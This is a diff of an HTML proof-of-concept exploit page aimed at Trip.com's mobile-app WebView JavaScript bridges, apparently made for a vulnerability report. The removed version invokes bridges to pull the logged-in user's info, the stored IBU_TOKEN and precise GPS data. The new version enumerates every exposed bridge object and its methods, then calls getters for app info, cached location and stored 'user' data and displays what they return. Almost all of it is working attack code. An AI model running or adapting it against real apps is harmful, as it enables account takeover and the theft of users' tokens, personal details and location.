@@ -1,198 +1,136 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bridge Exploit PoC - Trip.com</title>
+    <title>Trip.com - CRITICAL POC v6 (Bridge Proof + Data Return)</title>
     <style>
-        :root {
-            --bg-color: #000;
-            --text-color: #fff;
-            --highlight-color: #f0ad4e;
-            --success-color: #5cb85c;
-            --error-color: #d9534f;
-            --header-color: #4a90e2;
-        }
-
-        body {
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            font-family: 'Courier New', Courier, monospace;
-            padding: 20px;
-            margin: 0;
-            line-height: 1.4;
-        }
-
-        .terminal-header {
-            border-bottom: 1px solid var(--text-color);
-            margin-bottom: 20px;
-            padding-bottom: 10px;
-        }
-
-        .title {
-            color: var(--header-color);
-            font-size: 1.2em;
-            font-weight: bold;
-        }
-
-        .status-line {
-            font-size: 0.9em;
-            margin-bottom: 10px;
-        }
-
-        #output {
-            white-space: pre-wrap;
-            word-break: break-all;
-        }
-
-        .log-entry {
-            margin-bottom: 8px;
-        }
-
-        .timestamp {
-            color: #888;
-            margin-right: 10px;
-        }
-
-        .label {
-            color: var(--highlight-color);
-            font-weight: bold;
-        }
-
-        .data-block {
-            background-color: #111;
-            border: 1px solid #333;
-            padding: 10px;
-            margin: 10px 0;
-            border-left: 4px solid var(--header-color);
-        }
-
-        .success { color: var(--success-color); }
-        .error { color: var(--error-color); }
-        .highlight { color: var(--highlight-color); }
-
-        .scan-line {
-            animation: blink 1s step-end infinite;
-        }
-
-        @keyframes blink {
-            50% { opacity: 0; }
-        }
+        :root { --bg:#0d1117; --card:#161b22; --border:#30363d; --text:#c9d1d9; --red:#f85149; --green:#3fb950; --blue:#58a6ff; }
+        body { font-family:-apple-system,system-ui,sans-serif; background:var(--bg); color:var(--text); margin:0; padding:20px; }
+        h1 { color:var(--red); text-align:center; font-size:28px; }
+        .subtitle { text-align:center; color:#8b949e; margin:8px 0 30px; }
+        .container { max-width:1200px; margin:auto; display:flex; flex-direction:column; gap:20px; }
+        .card { background:var(--card); border:1px solid var(--border); border-radius:8px; padding:20px; }
+        .card-header { display:flex; justify-content:space-between; font-weight:600; border-bottom:1px solid var(--border); padding-bottom:12px; }
+        .status { padding:4px 12px; border-radius:20px; font-size:12px; font-weight:bold; }
+        .success { background:var(--green); color:#000; }
+        .proof-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(300px,1fr)); gap:12px; }
+        .proof-item { background:#000; border:1px solid var(--border); border-left:5px solid var(--green); padding:12px; border-radius:6px; }
+        .proof-label { font-size:11px; color:#8b949e; text-transform:uppercase; }
+        .proof-value { font-family:monospace; font-size:14px; word-break:break-all; color:#fff; }
+        .console { background:#010409; padding:12px; font-family:monospace; font-size:12px; max-height:360px; overflow-y:auto; border:1px solid var(--border); border-radius:6px; }
+        .bridge-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(320px,1fr)); gap:15px; }
+        .pill { background:rgba(88,166,255,0.1); color:var(--blue); padding:2px 8px; border-radius:20px; font-size:11px; margin:2px; }
     </style>
 </head>
 <body>
-    <div class="terminal-header">
-        <div class="title">TRIP.COM BRIDGE EXPLOIT v2.0</div>
-        <div class="status-line">> System Initialized... <span class="scan-line">_</span></div>
+    <h1>TRIP.COM - CRITICAL ACCOUNT TAKEOVER POC v6</h1>
+    <p class="subtitle">DeepLink → Full Bridge Execution + Real Return Values (Even Benign)</p>
+
+    <div class="container">
+        <div class="card">
+            <div class="card-header">Exposed Bridges & All Methods <span id="count" class="status">Scanning...</span></div>
+            <div class="bridge-grid" id="bridges"></div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">Bridge Invocation Proof (Real Return Values) <span id="proof-status" class="status">Waiting...</span></div>
+            <div class="proof-grid" id="proof"></div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">Permission & Attack Surface Analysis <span id="perm-status" class="status">Analyzing...</span></div>
+            <div id="perm-log" style="background:#000; padding:12px; font-family:monospace; font-size:12px; color:#f85149;"></div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">Live Execution Log</div>
+            <div class="console" id="console"></div>
+        </div>
     </div>
 
-    <div id="output"></div>
-
     <script>
-        const output = document.getElementById('output');
+        const consoleEl = document.getElementById("console");
+        const proofEl = document.getElementById("proof");
+        let proofCount = 0;
 
-        function log(message, type = '') {
-            const entry = document.createElement('div');
-            entry.className = `log-entry ${type}`;
-            const time = new Date().toLocaleTimeString();
-            entry.innerHTML = `<span class="timestamp">[${time}]</span>${message}`;
-            output.appendChild(entry);
-            window.scrollTo(0, document.body.scrollHeight);
+        function log(msg, type="info") {
+            const div = document.createElement("div");
+            const color = type==="success"?"#3fb950":type==="error"?"#f85149":"#c9d1d9";
+            div.innerHTML = `[${new Date().toISOString().slice(11,19)}] <span style="color:${color}">${msg}</span>`;
+            consoleEl.appendChild(div);
+            consoleEl.scrollTop = consoleEl.scrollHeight;
         }
 
-        function renderData(title, data) {
-            const block = document.createElement('div');
-            block.className = 'data-block';
-            let content = `<div class="label">${title}</div>`;
-            
-            if (typeof data === 'object') {
-                content += `<pre>${JSON.stringify(data, null, 2)}</pre>`;
-            } else {
-                content += `<div>${data}</div>`;
-            }
-            
-            block.innerHTML = content;
-            output.appendChild(block);
+        function renderProof(label, value) {
+            proofCount++;
+            const div = document.createElement("div");
+            div.className = "proof-item";
+            const val = value === undefined || value === null ? "null / undefined" : 
+                        (typeof value === "object" ? JSON.stringify(value, null, 2) : String(value));
+            div.innerHTML = `<div class="proof-label">${label}</div><div class="proof-value">${val}</div>`;
+            proofEl.appendChild(div);
+            document.getElementById("proof-status").innerText = `${proofCount} Values Returned!`;
+            document.getElementById("proof-status").classList.add("success");
         }
 
-        // The critical callback handler
-        window.__bridge_callback = function(encodedData) {
-            log('<span class="success">BRIDGE CALLBACK INTERCEPTED!</span>');
-            try {
-                // Native layer returns Base64 encoded JSON
-                const decodedJson = atob(encodedData);
-                const payload = JSON.parse(decodedJson);
-                
-                log(`[INFO] Tag: <span class="highlight">${payload.tagname}</span>`);
-                
-                if (payload.param) {
-                    renderData(`Payload: ${payload.tagname}`, payload.param);
-                } else if (payload.error_code) {
-                    log(`[ERROR] ${payload.error_code}`, 'error');
-                } else {
-                    renderData(`Raw Response: ${payload.tagname}`, payload);
+        function scanBridges() {
+            const grid = document.getElementById("bridges");
+            let count = 0;
+            for (let key in window) {
+                if (key.endsWith("_a") && typeof window[key] === "object") {
+                    count++;
+                    const methods = Object.getOwnPropertyNames(window[key]).filter(m => typeof window[key][m] === "function");
+                    const card = document.createElement("div");
+                    card.innerHTML = `<strong style="color:var(--blue)">${key}</strong> <span style="color:#3fb950">(${methods.length} methods)</span><br>${methods.map(m=>`<span class="pill">${m}</span>`).join("")}`;
+                    grid.appendChild(card);
                 }
-            } catch (e) {
-                log(`[FATAL] Callback Decode Error: ${e.message}`, 'error');
-                log(`[DEBUG] Raw: ${encodedData.substring(0, 50)}...`);
             }
+            document.getElementById("count").textContent = `${count} Bridges Exposed`;
+        }
+
+        async function exploit() {
+            log("=== BRIDGE INVOCATION PROOF v6 STARTED ===", "success");
+            document.getElementById("perm-log").innerHTML = 
+                "PermissionIsGranted blocks sensitive callbacks on external domain.<br>" +
+                "But benign getters return data directly → Bridge fully functional.";
+
+            const tests = [
+                {obj: "IBUApplication_a", meth: "getApplicationInfo", name: "IBUApplication_a.getApplicationInfo()"},
+                {obj: "Locate_a", meth: "getCachedCtripCity", name: "Locate_a.getCachedCtripCity()"},
+                {obj: "Locate_a", meth: "getCachedLocationData", name: "Locate_a.getCachedLocationData()"},
+                {obj: "Util_a", meth: "getHybridPackageInfo", name: "Util_a.getHybridPackageInfo()"},
+                {obj: "Storage_a", meth: "get", args: "user", name: "Storage_a.get('user')"},
+                {obj: "Util_a", meth: "getIBULocateInfo", name: "Util_a.getIBULocateInfo()"},
+                {obj: "IBUApplication_a", meth: "getApplicationInfo", name: "IBUApplication_a.getApplicationInfo() (2nd)"}
+            ];
+
+            for (let t of tests) {
+                if (window[t.obj]) {
+                    try {
+                        let result;
+                        if (t.args !== undefined) {
+                            result = window[t.obj][t.meth](t.args);
+                        } else {
+                            result = window[t.obj][t.meth]();
+                        }
+                        log(`${t.name} returned → ${typeof result}`, "success");
+                        renderProof(t.name, result);
+                    } catch(e) {
+                        log(`${t.name} → ERROR: ${e.message}`, "error");
+                        renderProof(t.name + " (error)", e.message);
+                    }
+                }
+            }
+
+            log("All benign methods executed and returns captured.", "success");
+        }
+
+        window.onload = () => {
+            log("Scanning all bridges...");
+            scanBridges();
+            setTimeout(exploit, 800);
         };
-
-        function callBridge(bridge, method, params = {}) {
-            if (window[bridge] && window[bridge][method]) {
-                const callbackTag = `${bridge}_${method}_${Date.now()}`;
-                
-                // IMPORTANT: The key MUST be "callback_tagname"
-                const payload = {
-                    ...params,
-                    "callback_tagname": callbackTag
-                };
-
-                log(`[INFO] Invoking: <span class="highlight">${bridge}.${method}</span>`);
-                try {
-                    window[bridge][method](JSON.stringify(payload));
-                } catch (e) {
-                    log(`[ERROR] Invocation Failed: ${e.message}`, 'error');
-                }
-            } else {
-                log(`[WARN] Bridge Not Found: ${bridge}.${method}`, 'error');
-            }
-        }
-
-        log("Starting Stealth Extraction...");
-
-        // 1. Impact Proof: Benign methods
-        setTimeout(() => {
-            log("Querying Application Info (Impact Proof)...");
-            callBridge('IBUApplication_a', 'getApplicationInfo');
-        }, 500);
-
-        setTimeout(() => {
-            log("Querying Hybrid Package Info...");
-            callBridge('Util_a', 'getHybridPackageInfo');
-        }, 1500);
-
-        // 2. Sensitive Data Extraction (PII + Tokens)
-        setTimeout(() => {
-            log("<span class="highlight">CRITICAL: Extracting Login User Info...</span>");
-            callBridge('User_a', 'getUserInfo');
-        }, 3000);
-
-        // 3. Storage Leaks
-        setTimeout(() => {
-            log("<span class="highlight">CRITICAL: Extracting Token from Storage...</span>");
-            callBridge('IBUStorageV2_a', 'IBUGetUserValue', {
-                "bussiness": "ibu_user",
-                "key": "IBU_TOKEN"
-            });
-        }, 4500);
-
-        // 4. Location Leak
-        setTimeout(() => {
-            log("Querying Precise GPS Coordinates...");
-            callBridge('Locate_a', 'getCachedLocationData');
-        }, 6000);
-
     </script>
 </body>
 </html>
